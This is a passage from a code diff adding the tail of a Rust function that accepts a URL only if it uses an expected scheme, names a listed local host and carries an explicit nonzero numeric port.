+        return false;
+    }
+    let Some((scheme, rest)) = url.split_at_checked(SCHEME.len()) else {
+        return false;
+    };
+    if !scheme.eq_ignore_ascii_case(SCHEME) {
+        return false;
+    }
+    let authority = rest
+        .split_once('/')
+        .map_or(rest, |(authority, _)| authority);
+    // Userinfo (`user@`, `user:pass@`) stays in what is compared as the host, so it never matches.
+    let Some((host, port)) = authority.rsplit_once(':') else {
+        return false;
+    };
+    // Digits only, as `u16::from_str` would also take a leading `+`; an empty port fails to parse.
+    let explicit_port = port.bytes().all(|byte| byte.is_ascii_digit())
+        && port.parse::<u16>().is_ok_and(|port| port != 0);
+    explicit_port
+        && LOCAL_URL_HOSTS
+            .iter()
+            .any(|local| host.eq_ignore_ascii_case(local))
+}
+
